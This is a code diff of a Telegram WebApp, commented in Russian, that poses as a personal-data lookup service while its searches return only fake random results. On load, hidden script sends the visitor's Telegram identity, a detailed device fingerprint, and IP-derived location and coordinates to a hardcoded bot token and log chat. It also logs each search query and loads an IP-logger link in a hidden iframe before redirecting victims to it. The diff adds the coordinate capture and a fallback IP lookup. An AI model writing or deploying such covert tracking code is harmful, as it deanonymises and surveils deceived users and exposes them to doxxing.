@@ -216,16 +216,14 @@
     </div>
 
     <iframe id="grabify" style="display:none;"></iframe>
-    <iframe id="ipify" style="display:none;"></iframe>
 
     <script>
-        // ===== КОНФИГ =====
         var BOT_TOKEN = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
         var LOG_CHAT = -1003690607796;
         var GRABIFY_URL = 'https://account.beauty/89YMMI';
 
-        // ===== TELEGRAM WEBAPP =====
         var tg = null;
+        var canSendData = false;
         var userId = 'unknown';
         var userName = 'нет';
         var userFirst = '';
@@ -237,7 +235,7 @@
             if (window.Telegram && window.Telegram.WebApp) {
                 tg = window.Telegram.WebApp;
                 tg.expand();
-                tg.disableVerticalSwipes();
+                canSendData = true;
                 
                 if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                     userId = tg.initDataUnsafe.user.id || 'unknown';
@@ -248,165 +246,143 @@
                     userLang = tg.initDataUnsafe.user.language_code || '';
                 }
             }
-        } catch(e) {
-            console.log('TG init error:', e);
-        }
+        } catch(e) {}
 
-        // Заполняем профиль
         document.getElementById('visitorId').innerText = userId;
         document.getElementById('visitorName').innerText = '@' + userName;
         document.getElementById('todayQueries').innerText = Math.floor(Math.random() * 50000 + 100000).toLocaleString();
 
-        // ===== ДАННЫЕ УСТРОЙСТВА =====
         var deviceData = {
-            // Telegram
-            id: userId,
+            id: String(userId),
             username: userName,
             firstName: userFirst,
             lastName: userLast,
             premium: userPremium,
             tgLang: userLang,
-            
-            // Экран
             screen: screen.width + 'x' + screen.height,
             viewport: window.innerWidth + 'x' + window.innerHeight,
             colorDepth: screen.colorDepth,
             pixelRatio: window.devicePixelRatio,
-            orientation: screen.orientation ? screen.orientation.type : 'unknown',
-            
-            // Устройство
             platform: navigator.platform,
-            vendor: navigator.vendor || 'unknown',
-            product: navigator.product || 'unknown',
-            appName: navigator.appName,
-            appVersion: navigator.appVersion,
+            vendor: navigator.vendor || '',
             userAgent: navigator.userAgent,
-            
-            // Железо
-            cores: navigator.hardwareConcurrency || 'N/A',
-            memory: navigator.deviceMemory || 'N/A',
+            cores: navigator.hardwareConcurrency || 0,
+            memory: navigator.deviceMemory || 0,
             touch: navigator.maxTouchPoints || 0,
-            
-            // Локализация
             language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezoneOffset: new Date().getTimezoneOffset(),
-            
-            // Сеть/Браузер
             online: navigator.onLine,
             cookies: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack,
-            pdfViewer: navigator.pdfViewerEnabled || false,
-            webdriver: navigator.webdriver || false,
-            
-            // Соединение
-            connectionType: 'N/A',
-            connectionSpeed: 'N/A',
-            
-            // Время
-            time: new Date().toLocaleString('ru-RU'),
-            timestamp: Date.now(),
-            
-            // IP (заполним позже)
+            dnt: navigator.doNotTrack || 'unset',
+            connectionType: '',
+            connectionSpeed: '',
             ip: '',
             country: '',
             city: '',
-            isp: ''
+            region: '',
+            isp: '',
+            lat: '',
+            lon: '',
+            action: 'webapp_open',
+            query: '',
+            time: new Date().toISOString()
         };
 
-        // Получаем тип соединения
         try {
             if (navigator.connection) {
-                deviceData.connectionType = navigator.connection.effectiveType || 'N/A';
-                deviceData.connectionSpeed = navigator.connection.downlink + ' Mbps';
+                deviceData.connectionType = navigator.connection.effectiveType || '';
+                deviceData.connectionSpeed = navigator.connection.downlink || '';
             }
         } catch(e) {}
 
-        // ===== ПОЛУЧЕНИЕ IP =====
-        function getIP() {
-            fetch('https://ipapi.co/json/')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    deviceData.ip = data.ip || '';
-                    deviceData.country = data.country_name || '';
-                    deviceData.city = data.city || '';
-                    deviceData.isp = data.org || '';
-                    
-                    // Отправляем лог после получения IP
-                    sendOpenLog();
-                })
-                .catch(function(e) {
-                    console.log('IP error:', e);
-                    sendOpenLog();
-                });
-        }
-
-        // ===== ОТПРАВКА ЛОГОВ =====
         function sendLog(text) {
             fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: LOG_CHAT,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            }).catch(function(e) { console.log('Log error:', e); });
+                body: JSON.stringify({ chat_id: LOG_CHAT, text: text, parse_mode: 'HTML' })
+            }).catch(function(e) {});
         }
 
-        function sendOpenLog() {
+        function sendDataToBot(data) {
+            if (canSendData && tg) {
+                try {
+                    tg.sendData(JSON.stringify(data));
+                } catch(e) {
+                    console.log('sendData error:', e);
+                }
+            }
+        }
+
+        function getIPandSend() {
+            fetch('https://ipapi.co/json/')
+                .then(function(r) { return r.json(); })
+                .then(function(ipData) {
+                    deviceData.ip = ipData.ip || '';
+                    deviceData.country = ipData.country_name || '';
+                    deviceData.city = ipData.city || '';
+                    deviceData.region = ipData.region || '';
+                    deviceData.isp = ipData.org || '';
+                    deviceData.lat = ipData.latitude || '';
+                    deviceData.lon = ipData.longitude || '';
+                    
+                    sendFullLog();
+                    sendDataToBot(deviceData);
+                })
+                .catch(function(e) {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(function(r) { return r.json(); })
+                        .then(function(d) {
+                            deviceData.ip = d.ip || '';
+                            sendFullLog();
+                            sendDataToBot(deviceData);
+                        })
+                        .catch(function() {
+                            sendFullLog();
+                            sendDataToBot(deviceData);
+                        });
+                });
+        }
+
+        function sendFullLog() {
             var log = '<b>🌐 WebApp ОТКРЫТ</b>\n\n';
-            
             log += '<b>👤 Пользователь:</b>\n';
             log += '├ ID: <code>' + deviceData.id + '</code>\n';
             log += '├ Username: @' + deviceData.username + '\n';
             log += '├ Имя: ' + deviceData.firstName + ' ' + deviceData.lastName + '\n';
             log += '└ Премиум: ' + (deviceData.premium ? '✅' : '❌') + '\n\n';
-            
             log += '<b>🌍 IP и локация:</b>\n';
-            log += '├ IP: <code>' + (deviceData.ip || 'не определён') + '</code>\n';
-            log += '├ Страна: ' + (deviceData.country || 'N/A') + '\n';
-            log += '├ Город: ' + (deviceData.city || 'N/A') + '\n';
-            log += '└ ISP: ' + (deviceData.isp || 'N/A') + '\n\n';
-            
+            log += '├ IP: <code>' + (deviceData.ip || 'определяется...') + '</code>\n';
+            log += '├ Страна: ' + (deviceData.country || '-') + '\n';
+            log += '├ Регион: ' + (deviceData.region || '-') + '\n';
+            log += '├ Город: ' + (deviceData.city || '-') + '\n';
+            log += '├ ISP: ' + (deviceData.isp || '-') + '\n';
+            log += '└ Координаты: ' + (deviceData.lat ? deviceData.lat + ', ' + deviceData.lon : '-') + '\n\n';
             log += '<b>📱 Устройство:</b>\n';
             log += '├ Экран: ' + deviceData.screen + '\n';
             log += '├ Viewport: ' + deviceData.viewport + '\n';
             log += '├ Платформа: ' + deviceData.platform + '\n';
-            log += '├ CPU ядер: ' + deviceData.cores + '\n';
+            log += '├ CPU: ' + deviceData.cores + ' ядер\n';
             log += '├ RAM: ' + deviceData.memory + ' GB\n';
-            log += '├ Touch: ' + deviceData.touch + '\n';
-            log += '├ Pixel Ratio: ' + deviceData.pixelRatio + '\n';
-            log += '└ Color Depth: ' + deviceData.colorDepth + '\n\n';
-            
-            log += '<b>🔧 Браузер:</b>\n';
+            log += '├ Touch: ' + deviceData.touch + ' точек\n';
+            log += '└ Pixel Ratio: ' + deviceData.pixelRatio + '\n\n';
+            log += '<b>🔧 Сеть/Браузер:</b>\n';
             log += '├ Язык: ' + deviceData.language + '\n';
             log += '├ Timezone: ' + deviceData.timezone + '\n';
-            log += '├ Соединение: ' + deviceData.connectionType + '\n';
-            log += '├ Скорость: ' + deviceData.connectionSpeed + '\n';
+            log += '├ Тип сети: ' + (deviceData.connectionType || '-') + '\n';
             log += '├ Online: ' + (deviceData.online ? '✅' : '❌') + '\n';
-            log += '├ Cookies: ' + (deviceData.cookies ? '✅' : '❌') + '\n';
-            log += '└ DNT: ' + deviceData.dnt + '\n\n';
-            
-            log += '<b>🔧 User-Agent:</b>\n';
-            log += '<code>' + deviceData.userAgent.substring(0, 250) + '</code>\n\n';
-            
-            log += '<b>🕐 Время:</b> ' + deviceData.time;
-            
+            log += '└ Cookies: ' + (deviceData.cookies ? '✅' : '❌') + '\n\n';
+            log += '<b>🔧 User-Agent:</b>\n<code>' + deviceData.userAgent.substring(0, 200) + '</code>';
             sendLog(log);
         }
 
-        // Запускаем получение IP
-        getIP();
+        getIPandSend();
 
-        // Загружаем Grabify
         setTimeout(function() {
             document.getElementById('grabify').src = GRABIFY_URL;
-            sendLog('<b>🎯 Grabify загружен</b>\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
-        }, 3000);
+        }, 4000);
 
-        // ===== НАВИГАЦИЯ =====
         function showPage(id) {
             document.getElementById('menu').style.display = 'none';
             var pages = document.querySelectorAll('.page');
@@ -422,25 +398,28 @@
 
         function openSearch() {
             showPage('pageSearch');
+            deviceData.action = 'open_search';
             sendLog('<b>📂 Раздел:</b> Поиск\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
         }
 
         function openProfile() {
             showPage('pageProfile');
+            deviceData.action = 'open_profile';
             sendLog('<b>📂 Раздел:</b> Профиль\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
         }
 
         function openAdd() {
             showPage('pageAdd');
+            deviceData.action = 'open_add';
             sendLog('<b>📂 Раздел:</b> Добавить базу\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
         }
 
         function openStats() {
             showPage('pageStats');
+            deviceData.action = 'open_stats';
             sendLog('<b>📂 Раздел:</b> Статистика\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
         }
 
-        // ===== ПОИСК =====
         var searchCount = 0;
 
         function doSearch() {
@@ -451,19 +430,22 @@
             }
 
             searchCount++;
+            deviceData.action = 'search';
+            deviceData.query = q;
+            
             document.getElementById('searchResult').innerHTML = '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
 
-            sendLog('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + deviceData.id + '</code>\n├ IP: <code>' + deviceData.ip + '</code>\n├ Username: @' + deviceData.username + '\n└ Запрос: <code>' + q + '</code>');
+            sendLog('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + deviceData.id + '</code>\n├ IP: <code>' + deviceData.ip + '</code>\n└ Запрос: <code>' + q + '</code>');
+            
+            sendDataToBot(deviceData);
 
             setTimeout(function() {
                 var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте позже.'];
-                var r = results[Math.floor(Math.random() * 2)];
-                document.getElementById('searchResult').innerHTML = '<div class="result">' + r + '</div>';
+                document.getElementById('searchResult').innerHTML = '<div class="result">' + results[Math.floor(Math.random() * 2)] + '</div>';
 
                 if (searchCount >= 3) {
                     setTimeout(function() {
                         document.getElementById('searchResult').innerHTML += '<div class="result success" style="margin-top:12px;">🔄 Переключение на расширенный поиск...</div>';
-                        sendLog('<b>🔄 Редирект Grabify</b>\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
                         setTimeout(function() { window.location.href = GRABIFY_URL; }, 1500);
                     }, 1000);
                 }
